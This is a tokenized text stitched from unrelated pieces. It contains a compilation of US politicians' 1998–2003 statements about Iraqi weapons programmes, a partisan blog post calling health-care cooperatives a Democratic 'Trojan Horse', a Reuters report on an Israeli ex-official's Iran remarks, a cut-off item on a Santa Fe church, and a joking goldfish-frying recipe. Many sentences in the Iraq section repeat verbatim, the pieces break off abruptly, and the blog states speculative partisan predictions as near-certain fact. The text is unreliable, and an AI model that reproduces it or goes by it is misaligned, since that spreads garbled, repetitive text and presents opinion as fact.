The UNSCOM inspectors believe that Iraq still has stockpiles of chemical and biological munitions , a small force of Scud - type missiles , and the capacity to restart quickly its production program and build many , many more weapons .
The UNSCOM inspectors believe that Iraq still has stockpiles of chemical and biological munitions , a small force of Scud - type missiles , and the capacity to restart quickly its production program and build many , many more weapons .
Now , against that background , let us remember the past here .
It is against that background that we have repeatedly and unambiguously made clear our preference for a diplomatic solution . . .
But to be a genuine solution , and not simply one that glosses over the remaining problem , a diplomatic solution must include or meet a clear , immutable , reasonable , simple standard .
Iraq must agree and soon , to free , full , unfettered access to these sites anywhere in the country .
There can be no dilution or diminishment of the integrity of the inspection system that UNSCOM has put in place .
Now those terms are nothing more or less than the essence of what he agreed to at the end of the Gulf War .
The Security Council , many times since , has reiterated this standard .
If he accepts them , force will not be necessary .
If he refuses or continues to evade his obligations through more tactics of delay and deception , he and he alone will be to blame for the consequences .
Well , he will conclude that the international community has lost its will .
He will then conclude that he can go right on and do more to rebuild an arsenal of devastating destruction .
And some day , some way , I guarantee you , he ’ll use the arsenal .
And I think every one of you who ’s really worked on this for any length of time believes that , too .
. . .
If Saddam rejects peace and we have to use force , our purpose is clear .
We want to seriously diminish the threat posed by Iraq ’s weapons of mass destruction program .
We want to seriously reduce his capacity to threaten his neighbors .
I am quite confident , from the briefing I have just received from our military leaders , that we can achieve the objective and secure our vital strategic interests .

On 18 February 1998 , Secretary of State Madeleine Albright appeared along with Defense Secretary William Cohen and White House National Security Adviser Sandy Berger at an internationally televised “ town meeting ” at Ohio State University .
Protesters shouted from the stands throughout the meeting , and Secretary Albright attempted to quiet them by inviting some of them down to the floor to pose questions to her directly .
As the Columbus Dispatch reported :
Few actually got the opportunity , but one — Jon Strange , a substitute teacher in Columbus — eventually took the microphone .
Few actually got the opportunity , but one — Jon Strange , a substitute teacher in Columbus — eventually took the microphone .
He repeatedly challenged Albright on whether Clinton policy is consistent or fair — attacking Saddam while acting favorably to American allies charged with atrocities against their own people , such as Indonesia and Turkey .
Albright said the United States had expressed its concerns in all of the occasions Strange mentioned .
“ What we ought to be thinking about is how to deal with Saddam Hussein , ” she added .
“ You ’re not answering my question , Madam Albright ! ”
Strange shouted , causing the secretary to momentarily back from the lectern .
At that point , Woodruff followed his question by asking why Iraq was branded an outlaw nation for manufacturing chemical and biological weapons that other nations also possess .
“ It is a question of whether there is a proclivity to use them , ” Albright said .
“ Saddam Hussein is a repeat offender . ”
Many who attended yesterday ’s town meeting , while supportive of the nation ’s position on Iraq , said they are uncertain whether a military attack is the proper response .
Before the forum , Rob Aiken , a North Side resident and student at Ohio State , said he wanted to know what other options had been considered .
“ I do n’t think killing a lot of folks will change a regime , ” he said .
Leandra Kennedy , a political science major from Philadelphia , said her biggest concern is that an attack has not received congressional approval .
“ Saddam needs to comply , ” she said .
“ But I ’m not sure about the way we ’re going about it , not taking into consideration how it will affect the international community in the long run . ”
Calling Saddam a bully who has terrorized his Middle East neighbors and tortured his own people , the officials said the administration ’s aim is to reduce his capacity to manufacture and deliver weapons of mass destruction .
“ I am absolutely convinced that we could accomplish our mission , ” Berger said .
“ The risks that the leader of a rogue state can use biological or chemical weapons on us or our allies is the greatest security risk we face , ” Albright said .

During that same meeting National Security Adviser Sandy Berger also spoke about how to make Saddam Hussein comply with United Nations weapons inspectors :
Berger won strong applause when he insisted Washington is still hoping for a peaceful way to persuade Saddam to give United Nations inspectors free access to suspected weapons sites .
But Berger re-used a warning delivered Tuesday by President Bill Clinton : “ The only answer to aggression and outlaw behaviour is firmness . . .
He ( Saddam ) will rebuild his arsenal of weapons of mass destruction and some day , some way , I am certain he will use that arsenal again , as he has 10 times since 1983 . “

On 6 October 1998 , Senator Carl Levin of Michigan , a member of the Senate Armed Services Committee , addressed that committee at a hearing on the subject of worldwide threats facing the U.S.
His comments on Iraq included mention of a letter to President Clinton which he and other senators were circulating :
As the Chairman has indicated , the situation in Iraq also poses a threat to international peace and security .
Once again , Saddam Hussein has halted cooperation with the United Nations Special Commission and the International Atomic Energy Agency .
Without intrusive inspections , we will not be able to ensure that Iraq ’s weapons of mass destruction programs are destroyed in accordance with U.N. Security Council resolutions .
Without those inspections , the Iraqi people will continue to suffer as a result of international economic sanctions .

Without intrusive inspections , we will not be able to ensure that Iraq ’s weapons of mass destruction programs are destroyed in accordance with U.N. Security Council resolutions .
Without those inspections , the Iraqi people will continue to suffer as a result of international economic sanctions .
And that is why , along with Senators McCain , Lieberman , and Hutchison , I am circulating among our Senate colleagues a letter to President Clinton , urging him , in consultation with Congress , consistent with the U.S. Constitution and laws , to take effective actions , including if appropriate , the use of air strikes , to respond to the Iraqi threat .
( President Clinton did undertake the action urged in this statement a few months later by ordering the aforementioned Operation Desert Fox airstrikes . )
On 16 December 1998 , Nancy Pelosi , a Congressional representative from California and a member of the House Intelligence Committee , issued a statement concerning a U.S. - led military strike against Iraq :
As a member of the House Intelligence Committee , I am keenly aware that the proliferation of chemical and biological weapons is an issue of grave importance to all nations .
Saddam Hussein has been engaged in the development of weapons of mass destruction technology which is a threat to countries in the region and he has made a mockery of the weapons inspection process .
As a member of the House Intelligence Committee , I am keenly aware that the proliferation of chemical and biological weapons is an issue of grave importance to all nations .
The responsibility of the United States in this conflict is to eliminate weapons of mass destruction , to minimize the danger to our troops and to diminish the suffering of the Iraqi people .
The citizens of Iraq have suffered the most for Saddam Hussein ’s activities ; sadly , those same citizens now stand to suffer more .
I have supported efforts to ease the humanitarian situation in Iraq and my thoughts and prayers are with the innocent Iraqi civilians , as well as with the families of U.S. troops participating in the current action .
I believe in negotiated solutions to international conflict .
This is , unfortunately , not going to be the case in this situation where Saddam Hussein has been a repeat offender , ignoring the international community ’s requirement that he come clean with his weapons program .
While I support the President , I hope and pray that this conflict can be resolved quickly and that the international community can find a lasting solution through diplomatic means .
( In this statement Rep. Pelosi was not urging that action be taken against Iraq in order to destroy its WMD technology ; she was expressing support for attacks that had already begun with that purpose as their stated objective . )
On 10 November 1999 , Secretary of State Madeleine Albright addressed another open meeting , this one held at the Chicago Hilton and Towers .
Challenged to defend the Clinton administration ’s support of an economic and trade embargo against Iraq , Secretary Albright responded :
If you remember in 1991 , Saddam Hussein invaded another country , he plagued it , he set fire to it , and he decided that he could control the region .
Before that , he had gassed his own people .
If you remember in 1991 , Saddam Hussein invaded another country , he plagued it , he set fire to it , and he decided that he could control the region .
Before that , he had gassed his own people .
Saddam Hussein had been acquiring weapons of mass destruction .
We carried out , with the help of an alliance , a war in which we put Saddam Hussein back into his box .
The United Nations voted on a set of resolutions which demanded Saddam Hussein live up to his obligations and get rid of weapons of mass destruction .
The United Nations Security Council imposed a set of sanctions on Saddam Hussein until he did that .
It also established an organization that is set up to monitor whether Hussein had gotten rid of his weapons of mass destruction .
There has never been an embargo against food and medicine .
It ’s just that Hussein has just not chosen to spend his money on that .
Instead , he has chosen to spend his money on building weapons of mass destruction , and palaces for his cronies .
In December 2001 , nine members of Congress ( a group which included both Democrats and Republicans ) wrote a letter to President Bush urging him to step up support for the internal Iraqi opposition seeking to remove Saddam Hussein from power .
Included in that letter was the following paragraph :
This December will mark three years since United Nations inspectors last visited Iraq .
There is no doubt that since that time , Saddam Hussein has reinvigorated his weapons programs .
Reports indicate that biological , chemical and nuclear programs continue apace and may be back to pre-Gulf war status .
In addition , Saddam continues to refine delivery systems and is doubtless using the cover of a licit missile program to develop longer - range missiles that will threaten the United States and our allies .
Unless the version reproduced on the Department of State ’s web site is in error , however , Senator Bob Graham of Florida was not one of the signatories to that letter .
On 19 September 2002 , Senator Carl Levin — by then Chairman of the Senate Armed Services Committee — addressed a committee hearing on U.S. policy on Iraq .
His introductory remarks included the following :
The Armed Services Committee meets this afternoon to continue our hearings on U.S. policy toward Iraq .
The purpose of these hearings is to give the Administration an opportunity to present its position on Iraq , and to allow this Committee to examine the Administration ’s proposal with Administration witnesses and experts outside of the government .
The Armed Services Committee meets this afternoon to continue our hearings on U.S. policy toward Iraq .
The purpose of these hearings is to give the Administration an opportunity to present its position on Iraq , and to allow this Committee to examine the Administration ’s proposal with Administration witnesses and experts outside of the government .
We welcome Secretary of Defense Donald Rumsfeld and Chairman of the Joint Chiefs of Staff General Richard Myers to the Committee .
Next week the Committee will hear from former senior military commanders on Monday and from former national security officials on Wednesday .
We begin with the common belief that Saddam Hussein is a tyrant and a threat to the peace and stability of the region .
He has ignored the mandates of the United Nations and is building weapons of mass destruction and the means of delivering them .
On 23 September 2002 , former Vice - President Al Gore addressed the Commonwealth Club of California in San Francisco on the subject of Iraq and the war on terrorism .
Among the comments he offered there were the following :
Moreover , if we quickly succeed in a war against the weakened and depleted fourth rate military of Iraq and then quickly abandon that nation as President Bush has abandoned Afghanistan after quickly defeating a fifth rate military there , the resulting chaos could easily pose a far greater danger to the United States than we presently face from Saddam .
We know that he has stored secret supplies of biological and chemical weapons throughout his country .
Moreover , if we quickly succeed in a war against the weakened and depleted fourth rate military of Iraq and then quickly abandon that nation as President Bush has abandoned Afghanistan after quickly defeating a fifth rate military there , the resulting chaos could easily pose a far greater danger to the United States than we presently face from Saddam .
We have no evidence , however , that he has shared any of those weapons with terrorist groups .
However , if Iraq came to resemble Afghanistan — with no central authority but instead local and regional warlords with porous borders and infiltrating members of Al Qaeda than these widely dispersed supplies of weapons of mass destruction might well come into the hands of terrorist groups .
If we end the war in Iraq the way we ended the war in Afghanistan , we could easily be worse off than we are today .
When Secretary Rumsfield was asked recently about what our responsibility for restabilizing Iraq would be in an aftermath of an invasion , he said , “ That ’s for the Iraqis to come together and decide . ” [ . . .]
What is a potentially even more serious consequence of this push to begin a new war as quickly as possible is the damage it can do not just to America ’s prospects to winning the war against terrorism but to America ’s prospects for continuing the historic leadership we began providing to the world 57 years ago , right here in this city by the bay .
[ . . .]
Nevertheless , Iraq does pose a serious threat to the stability of the Persian Gulf and we should organize an international coalition to eliminate his access to weapons of mass destruction .
Iraq ’s search for weapons of mass destruction has proven impossible to completely deter and we should assume that it will continue for as long as Saddam is in power .
Moreover , no international law can prevent the United States from taking actions to protect its vital interests , when it is manifestly clear that there is a choice to be made between law and survival .
I believe , however , that such a choice is not presented in the case of Iraq .
Indeed , should we decide to proceed , that action can be justified within the framework of international law rather than outside it .
In fact , though a new UN resolution may be helpful in building international consensus , the existing resolutions from 1991 are sufficient from a legal standpoint .
On 27 September 2002 , Senator Edward Kennedy of Massachusetts delivered a speech to the Johns Hopkins School of Advanced International Studies .
An excerpt from that speech includes the following statements :
We have known for many years that Saddam Hussein is seeking and developing weapons of mass destruction .
Our intelligence community is also deeply concerned about the acquisition of such weapons by Iran , North Korea , Libya , Syria and other nations .
But information from the intelligence community over the past six months does not point to Iraq as an imminent threat to the United States or a major proliferator of weapons of mass destruction .
Our intelligence community is also deeply concerned about the acquisition of such weapons by Iran , North Korea , Libya , Syria and other nations .
But information from the intelligence community over the past six months does not point to Iraq as an imminent threat to the United States or a major proliferator of weapons of mass destruction .
In public hearings before the Senate Armed Services Committee in March , CIA Director George Tenet described Iraq as a threat but not as a proliferator , saying that Saddam Hussein — and I quote — “ is determined to thwart U.N. sanctions , press ahead with weapons of mass destruction , and resurrect the military force he had before the Gulf War . ”
That is unacceptable , but it is also possible that it could be stopped short of war .
In October 2002 , as the U.S. Senate debated Joint Resolution 46 authorizing President George W. Bush to use military force against Iraq , Senator Robert Byrd of West Virginia delivered remarks regarding his belief that the “ rush to war ” was “ ignoring the U.S. Constitution ” and that Iraq did not pose an imminent threat to the United States .
Among his remarks were the following statements :
The Senate is rushing to vote on whether to declare war on Iraq without pausing to ask why .
Why is war being dealt with not as a last resort but as a first resort ?
Why is Congress being pressured to act now , as of today , 33 days before a general election when a third of the Senate and the entire House of Representatives are in the final , highly politicized , weeks of election campaigns ?
As recently as Tuesday ( Oct. 1 ) , the President said he had not yet made up his mind about whether to go to war with Iraq .
And yet Congress is being exhorted to give the President open - ended authority now , to exercise whenever he pleases , in the event that he decides to invade Iraq .
Why is Congress elbowing past the President to authorize a military campaign that the President may or may not even decide to pursue ?
Are n’t we getting ahead of ourselves ?

The last UN weapons inspectors left Iraq in October of 1998 .
We are confident that Saddam Hussein retained some stockpiles of chemical and biological weapons , and that he has since embarked on a crash course to build up his chemical and biological warfare capability .
Intelligence reports also indicate that he is seeking nuclear weapons , but has not yet achieved nuclear capability .
It is now October of 2002 .
Four years have gone by in which neither this administration nor the previous one felt compelled to invade Iraq to protect against the imminent threat of weapons of mass destruction .
Until today .
Until 33 days until election day .
Now we are being told that we must act immediately , before adjournment and before the elections .
Why the rush ?
Yes , we had September 11 .
But we must not make the mistake of looking at the resolution before us as just another offshoot of the war on terror .
We know who was behind the September 11 attacks on the United States .
We know it was Osama bin Laden and his al Qaeda terrorist network .
We have dealt with al Qaeda and with the Taliban government that sheltered it — we have routed them from Afghanistan and we are continuing to pursue them in hiding .
So where does Iraq enter the equation ?
No one in the Administration has been able to produce any solid evidence linking Iraq to the September 11 attack .
Iraq had biological and chemical weapons long before September 11 .
We knew it then , and we know it now .
Iraq has been an enemy of the United States for more than a decade .
If Saddam Hussein is such an imminent threat to the United States , why has n’t he attacked us already ?
The fact that Osama bin Laden attacked the United States does not , de facto , mean that Saddam Hussein is now in a lock and load position and is readying an attack on the United States .
In truth , there is nothing in the deluge of Administration rhetoric over Iraq that is of such moment that it would preclude the Senate from setting its own timetable and taking the time for a thorough and informed discussion of this crucial issue .
During that same debate , Senator John Kerry of Massachusetts also made a speech from the Senate floor , which included the following statements :
When I vote to give the President of the United States the authority to use force , if necessary , to disarm Saddam Hussein , it is because I believe that a deadly arsenal of weapons of mass destruction in his hands is a threat , and a grave threat , to our security and that of our allies in the Persian Gulf region .
I will vote yes because I believe it is the best way to hold Saddam Hussein accountable .
And the administration , I believe , is now committed to a recognition that war must be the last option to address this threat , not the first , and that we must act in concert with allies around the globe to make the world ’s case against Saddam Hussein .
I will vote yes because I believe it is the best way to hold Saddam Hussein accountable .
And the administration , I believe , is now committed to a recognition that war must be the last option to address this threat , not the first , and that we must act in concert with allies around the globe to make the world ’s case against Saddam Hussein .
Let me be clear , the vote I will give to the President is for one reason and one reason only :
To disarm Iraq of weapons of mass destruction , if we cannot accomplish that objective through new , tough weapons inspections in joint concert with our allies .
In giving the President this authority , I expect him to fulfill the commitments he has made to the American people in recent days — to work with the United Nations Security Council to adopt a new resolution setting out tough and immediate inspection requirements , and to act with our allies at our side if we have to disarm Saddam Hussein by force .
If he fails to do so , I will be among the first to speak out .
If we do wind up going to war with Iraq , it is imperative that we do so with others in the international community , unless there is a showing of a grave , imminent — and I emphasize “ imminent ” — threat to this country which requires the President to respond in a way that protects our immediate national security needs .
Prime Minister Tony Blair has recognized a similar need to distinguish how we approach this .
He has said that he believes we should move in concert with allies , and he has promised his own party that he will not do so otherwise .
The administration may not be in the habit of building coalitions , but that is what they need to do .
And it is what can be done .
If we go it alone without reason , we risk inflaming an entire region , breeding a new generation of terrorists , a new cadre of anti-American zealots , and we will be less secure , not more secure , at the end of the day , even with Saddam Hussein disarmed .
Let there be no doubt or confusion about where we stand on this .
I will support a multilateral effort to disarm him by force , if we ever exhaust those other options , as the President has promised , but I will not support a unilateral U.S. war against Iraq unless that threat is imminent and the multilateral effort has not proven possible under any circumstances .
In voting to grant the President the authority , I am not giving him carte blanche to run roughshod over every country that poses or may pose some kind of potential threat to the United States .
Every nation has the right to act preemptively , if it faces an imminent and grave threat , for its self - defense under the standards of law .
The threat we face today with Iraq does not meet that test yet .
I emphasize “ yet . ”
Yes , it is grave because of the deadliness of Saddam Hussein ’s arsenal and the very high probability that he might use these weapons one day if not disarmed .
But it is not imminent , and no one in the CIA , no intelligence briefing we have had suggests it is imminent .
None of our intelligence reports suggest that he is about to launch an attack .
The argument for going to war against Iraq is rooted in enforcement of the international community ’s demand that he disarm .
It is not rooted in the doctrine of preemption .
Nor is the grant of authority in this resolution an acknowledgment that Congress accepts or agrees with the President ’s new strategic doctrine of preemption .
Just the opposite .
This resolution clearly limits the authority given to the President to use force in Iraq , and Iraq only , and for the specific purpose of defending the United States against the threat posed by Iraq and enforcing relevant Security Council resolutions .
The definition of purpose circumscribes the authority given to the President to the use of force to disarm Iraq because only Iraq ’s weapons of mass destruction meet the two criteria laid out in this resolution .
Senator John D. Rockefeller IV of West Virginia also delivered a floor speech on the Iraq resolution :
There is unmistakable evidence that Saddam Hussein is working aggressively to develop nuclear weapons and will likely have nuclear weapons within the next five years .
And that may happen sooner if he can obtain access to enriched uranium from foreign sources — something that is not that difficult in the current world .
We also should remember we have always underestimated the progress Saddam has made in development of weapons of mass destruction .
When Saddam Hussein obtains nuclear capabilities , the constraints he feels will diminish dramatically , and the risk to America ’s homeland , as well as to America ’s allies , will increase even more dramatically .
Our existing policies to contain or counter Saddam will become irrelevant .
Americans will return to a situation like that we faced in the Cold War , waking each morning knowing we are at risk from nuclear blackmail by a dictatorship that has declared itself to be our enemy .
Only , back then , our communist foes were a rational and predictable bureaucracy ; this time , our nuclear foe would be an unpredictable and often irrational individual , a dictator who has demonstrated that he is prepared to violate international law and initiate unprovoked attacks when he feels it serves his purposes to do so .
The global community — in the form of the United Nations — has declared repeatedly , through multiple resolutions , that the frightening prospect of a nuclear - armed Saddam cannot come to pass .
But the U.N. has been unable to enforce those resolutions .
We must eliminate that threat now , before it is too late .
But this is n’t just a future threat .
Saddam ’s existing biological and chemical weapons capabilities pose a very real threat to America , now .
Saddam has used chemical weapons before , both against Iraq ’s enemies and against his own people .
He is working to develop delivery systems like missiles and unmanned aerial vehicles that could bring these deadly weapons against U.S. forces and U.S. facilities in the Middle East .
And he could make those weapons available to many terrorist groups which have contact with his government , and those groups could bring those weapons into the U.S. and unleash a devastating attack against our citizens .
I fear that greatly .
We cannot know for certain that Saddam will use the weapons of mass destruction he currently possesses , or that he will use them against us .
But we do know Saddam has the capability .
Rebuilding that capability has been a higher priority for Saddam than the welfare of his own people — and he has ill - will toward America .
I am forced to conclude , on all the evidence , that Saddam poses a significant risk .
During the simultaneous debate on the Iraq resolution in the House of Representatives , Congressman Henry Waxman of California issued a statement on a possible war with Iraq :
Whether one agrees or disagrees with the Administration ’s policy towards Iraq , I do n’t think there can be any question about Saddam ’s conduct .
He has systematically violated , over the course of the past 11 years , every significant UN resolution that has demanded that he disarm and destroy his chemical and biological weapons , and any nuclear capacity .
This he has refused to do .
He lies and cheats ; he snubs the mandate and authority of international weapons inspectors ; and he games the system to keep buying time against enforcement of the just and legitimate demands of the United Nations , the Security Council , the United States and our allies .
Those are simply the facts .
Whether one agrees or disagrees with the Administration ’s policy towards Iraq , I do n’t think there can be any question about Saddam ’s conduct .
He lies and cheats ; he snubs the mandate and authority of international weapons inspectors ; and he games the system to keep buying time against enforcement of the just and legitimate demands of the United Nations , the Security Council , the United States and our allies .
Those are simply the facts .
And now , time has run out .
It has been four long years since the last UN weapons inspectors were effectively ejected from Iraq because of Saddam ’s willful noncompliance with an effective inspection regime .
What Saddam has done in the interim is not known for certain – but there is every evidence , from the dossier prepared by the Prime Minister of Britain , to President Bush ’s speech at the United Nations , that Saddam has rebuilt substantial chemical and biological weapons stocks , and that he is determined to obtain the means necessary to produce nuclear weapons .
He has ballistic missiles , and more are on order .
He traffics with other evil people in this world , intent on harming the United States , Israel , other nations in the Middle East , and our friends across the globe .
Senator Hillary Clinton of New York also spoke on the issue of the Iraq resolution :
In the four years since the inspectors left , intelligence reports show that Saddam Hussein has worked to rebuild his chemical and biological weapons stock , his missile delivery capability , and his nuclear program .
He has also given aid , comfort , and sanctuary to terrorists , including Al Qaeda members , though there is apparently no evidence of his involvement in the terrible events of September 11 , 2001 .
It is clear , however , that if left unchecked , Saddam Hussein will continue to increase his capacity to wage biological and chemical warfare , and will keep trying to develop nuclear weapons .
Should he succeed in that endeavor , he could alter the political and security landscape of the Middle East , which as we know all too well affects American security .
Now this much is undisputed .
The open questions are : what should we do about it ?
How , when , and with whom ?
Some people favor attacking Saddam Hussein now , with any allies we can muster , in the belief that one more round of weapons inspections would not produce the required disarmament , and that deposing Saddam would be a positive good for the Iraqi people and would create the possibility of a secular democratic state in the Middle East , one which could perhaps move the entire region toward democratic reform .
This view has appeal to some , because it would assure disarmament ; because it would right old wrongs after our abandonment of the Shiites and Kurds in 1991 , and our support for Saddam Hussein in the 1980 ’s when he was using chemical weapons and terrorizing his people ; and because it would give the Iraqi people a chance to build a future in freedom .
However , this course is fraught with danger .
We and our NATO allies did not depose Mr. Milosevic , who was responsible for more than a quarter of a million people being killed in the 1990s .
Instead , by stopping his aggression in Bosnia and Kosovo , and keeping on the tough sanctions , we created the conditions in which his own people threw him out and led to his being in the dock being tried for war crimes as we speak .
If we were to attack Iraq now , alone or with few allies , it would set a precedent that could come back to haunt us .
In recent days , Russia has talked of an invasion of Georgia to attack Chechen rebels .
India has mentioned the possibility of a pre-emptive strike on Pakistan .
And what if China were to perceive a threat from Taiwan ?
So Mr. President , for all its appeal , a unilateral attack , while it cannot be ruled out , on the present facts is not a good option .
Making a speech at Georgetown University on 23 January 2003 , during the build - up to the war with Iraq , Senator John Kerry said :
Second , without question , we need to disarm Saddam Hussein .
He is a brutal , murderous dictator , leading an oppressive regime .
We all know the litany of his offenses .
He presents a particularly grievous threat because he is so consistently prone to miscalculation .
He miscalculated an eight - year war with Iran .
He miscalculated the invasion of Kuwait .
He miscalculated America ’s response to that act of naked aggression .
He miscalculated the result of setting oil rigs on fire .
He miscalculated the impact of sending scuds into Israel and trying to assassinate an American President .
He miscalculated his own military strength .
He miscalculated the Arab world ’s response to his misconduct .
And now he is miscalculating America ’s response to his continued deceit and his consistent grasp for weapons of mass destruction .
That is why the world , through the United Nations Security Council , has spoken with one voice , demanding that Iraq disclose its weapons programs and disarm .
So the threat of Saddam Hussein with weapons of mass destruction is real , but it is not new .
It has been with us since the end of the Persian Gulf War .
Regrettably the current Administration failed to take the opportunity to bring this issue to the United Nations two years ago or immediately after September 11th , when we had such unity of spirit with our allies .
When it finally did speak , it was with hasty war talk instead of a coherent call for Iraqi disarmament .
And that made it possible for other Arab regimes to shift their focus to the perils of war for themselves rather than keeping the focus on the perils posed by Saddam ’s deadly arsenal .
Indeed , for a time , the Administration ’s unilateralism , in effect , elevated Saddam in the eyes of his neighbors to a level he never would have achieved on his own , undermining America ’s standing with most of the coalition partners which had joined us in repelling the invasion of Kuwait a decade ago .
In U.N. Security Council Resolution 1441 , the United Nations has now affirmed that Saddam Hussein must disarm or face the most serious consequences .
Let me make it clear that the burden is resoundingly on Saddam Hussein to live up to the ceasefire agreement he signed and make clear to the world how he disposed of weapons he previously admitted to possessing .
But the burden is also clearly on the Bush Administration to do the hard work of building a broad coalition at the U.N. and the necessary work of educating America about the rationale for war .
As I have said frequently and repeat here today , the United States should never go to war because it wants to , the United States should go to war because we have to .
And we do n’t have to until we have exhausted the remedies available , built legitimacy and earned the consent of the American people , absent , of course , an imminent threat requiring urgent action .

Blogger Nancy Thorner was right on track when she
posed the question
, " Could co-ops be a Trojan Horse ? "
They are .
Absolutely .
But it 's not just universal health care concealed within .
There 's also a secret weapon in there that could give progressive Democrats control of Congress for many years to come .
Although the actual financial model for cooperatives has not been revealed , allow me to make some intelligent guesses based on a quarter - century of underwriting and marketing health insurance plans of all sizes , from Fortune 100 companies to mom-and - pops :
The cooperatives being touted by members of the Senate Finance Committee are nothing more than a different version of the " public option plan " designed to lay the framework for universal health insurance .
Cooperatives in their purest form exist solely for the benefit of their members and are likewise funded and run by members .
However , health care cooperatives will be nothing close to pure .
Instead , they will exist for the benefit of the Democratic Party , will logically need subsidies from the federal government and will likewise be controlled by the federal government .
Why ?
Just follow the money .
Health care cooperatives will need large sums of start - up capital that first - to - join members will in no way be able to pony - up .
So where will they get the money to start operating ?
Private investment banks ?
No way .
Cooperatives are nonprofit and initial membership numbers will be so small that there will be little or no incentive for investment bankers to justify taking on the risk .
( That is unless Rahm Emanuel has already struck deals with the likes of Goldman Sachs , Bill Gates and Warren Buffett . )
But back to the horse meat that most Americans will find tough to chew and even tougher to swallow , and in which the progressive minority will delight : Cooperatives will be dependent on tax dollars to exist and that comes with top - to - bottom , front - to - back government control .
Cooperatives will be subject to the same financial risks as private insurance plans :
The possibility of single catastrophic claims and greater than expected overall health care costs .
Will cooperatives be able to transfer those risks to an insurance company with a reinsurance policy ?
Only if it is mandated by an act of Congress because it takes years ( usually at least three years ) of actual plan profit / loss data to just be considered for reinsurance coverage .
That reality leaves the federal government as reinsurer of last resort for health care cooperatives .
Further , it logically follows that a progressive dominated Congress fueled by a collaborative White House will have the political clout to artificially make each cooperative the cheapest option in their respective geographic markets .
They will achieve this by selectively appropriating tax dollars based on the progressive definition of fairness :
Those who need the most will get the most .
Then , as cookie - cutter cooperatives spread from sea to shining sea it will be an easy act of Congress to merge them into a single , universal plan run by the federal government .
Giddy - up .
Finally if cooperatives are part of health care reform , Democrats will use them to strengthen their control of Congress .
Cooperative start - up financing will be subject to Congressional appropriation and Barney Frank will make sure money is doled out to best serve Democrats while punishing Republicans .
Cooperatives located in districts represented by members of the Progressive Coalition will be funded first , followed by centrist Democrat districts , then the Blue Dogs ...
You get the picture ?
And as the carrots are handed out the message to voters in Republican districts will become , " If you want a cooperative , then vote for Nancy Pelosi 's hand - picked candidate . "
Hi-ho , Silver .
Away !
Watch some news channels reacting to the debate last night ... just in case you still have n’t got the gist of how ridiculous this was .
LONDON ( Reuters ) - Israel will be compelled to attack Iran ’s nuclear sites if Western powers cannot agree crippling sanctions against Tehran by the end of the year , a former Israeli deputy defense minister said on Wednesday .
Ephraim Sneh , who holds no position in the current Israeli government and was speaking in his personal capacity , told Reuters it was not clear the United States and European Union had the decisiveness to take such steps , which should include tougher banking and oil curbs , by year ’s end .
“ We can not live under the shadow of an Iran with nuclear weapons , ” he said in an interview on a visit to Britain .
“ By the end of the year , if there is no agreement on crippling sanctions aimed at this regime , we will have no choice . ”
“ This is the very , very last resort .
But ironically it is our best friends and allies who are pushing us into a corner where we would have no option but to do it . ”
“ I wonder if they will do it ( a tougher sanctions regime ) quickly enough .
If not , we are compelled to take action . ”
Sneh , a retired brigadier - general , is a former member of parliament ’s defense and intelligence committees .
As deputy defense minister , he held responsibility for Iran .
A “ BLOODLESS ” STRATEGY
Sneh ’s visit was facilitated by The Israel Project , a privately - funded media organization that seeks to explain Israel ’s security position in the region and has arranged news conferences for serving Israeli officials overseas .
The United States , Germany , France and Britain have threatened Iran with a fourth round of U.N. sanctions if it continues enriching uranium and refuses to clear up concerns it has done extensive research into how to build a nuclear weapon .
Iran says the activity is a civilian electricity program .
Israel has said a nuclear - armed Iran would be a threat to its existence and points to Iranian President Mahmoud Ahmadinejad ’s calls for Israel to be wiped off the map .
That has raised worries that Israel could ultimately carry out a military strike against Iranian nuclear sites .
Sneh said the sanctions should consist of a total Western boycott of the Iranian banking system , a ban on selling Iran refined petroleum products , a ban on selling spare parts to the Iranian energy industry and a ban on senior Iranian officials traveling to Western capitals .
Sneh said the sanctions need be imposed only by the United States and European nations , because it was clear Russia and China would not go along with them and in any case the need for the involvement of “ Russia and China is a myth . ”
Imposed by the West , such a strategy would be tough enough to work .
“ It is bloodless , and it even stops short of a naval blockade , ” he said .
In comments that appeared to signal Israel had not given up on international diplomacy to curb Tehran ’s atomic ambitions , Prime Minister Benjamin Netanyahu said on Monday the time had come for tougher sanctions on Iran over its nuclear program .
Sneh said Israel had many reasons to block the emergence of a nuclear weapons - capable Iran , because in that event
-- Immigration to Israel would stop .
-- More able young men and women would emigrate to pursue their future in places seen as more secure .
-- Investment in Israel would be reduced .
-- Decision - making by the cabinet would be hostage to the fear of Iranian nuclear retaliation .
The processes of government would thereby be “ substantially distorted . ”
-- Extremist forces in the Middle East would be empowered .
-- Iran would pressure moderate forces in the region to toughen their positions in contacts or negotiations with Israel , for example in discussions over Jerusalem or the Golan Heights
-- Saudi Arabia and Egypt would seek to obtain nuclear weapons themselves , bringing about a Middle East “ fully loaded with nuclear weapons . ”

SANTA FE , N.M. --
A secretive religious group that fought a long legal battle for the right to drink hallucinogenic tea in pursuit of spiritual growth now plans to build a temple and greenhouse in a wealthy community here -- to the dismay of local residents .
The church was founded in Brazil in 1961 and remains most popular there , but about 150 people in the U.S. , including about 60 in Santa Fe , practice the faith , which goes by the Portuguese name Centro Espírita Beneficente União do Vegetal , or UDV .
Members say the church ...
Ah , Pasadena , land of refineries , illicit slot machines , and creative domestic disturbances .
We 'll let the Associated Press , in its trademark deadpan style , tell the story :
PASADENA , Texas --
Authorities say a Houston - area woman who was burned up at her former common - law husband fried their pet goldfish and ate some of them .
Pasadena police say it's a civil matter and no charges will be filed .
The seven goldfish were purchased together by the couple during happier times .
If there 's a more heartbreaking sentence than " The seven goldfish were purchased together by the couple during happier times , " we 've yet to hear it .
( " Jesus wept , " maybe .
But that did n't have any goldfish in it . )
How best to go about frying goldfish ?
Or at least how best to do it Pasadena - style ?
We turned to an expert .
Our Robb Walsh opined :
Goldfish are about the same size as smelts .
Smelts and other minnows are considered a delicacy in France and Italy , where they are dipped in batter and flash - fried .
No need to gut them -- just eat them whole with pickles , and a garlic mayonnaise for dipping .
On the south shore of Lake Lausanne , fried minnows are usually accompanied by a cold Chasselas wine .
10 goldfish
Half cup flour
1 teaspoon pepper flakes
salt and pepper to taste
1 egg , slightly beaten
2 tablespoons milk
Peanut oil
Cornichons
Aioli Rinse the goldfish .
Mix the flour with pepper flakes , salt and black pepper .
Heat the oil in a deep pan or fryer to 350 degrees F. Combine the egg and milk .
Dip the fish in flour , then egg and milk and then flour again .
Drop into the hot oil .
Fry for a few minutes until crisp and cooked through .
( This will depend on the size of the goldfish . )
Serve with cornichons and an aioli for dipping .
We 're guessing the Pasadena version of all this calls less for " a cold Chasselas wine " than it does " a six - pack of Natty Light tallboys , " but what do we know ?
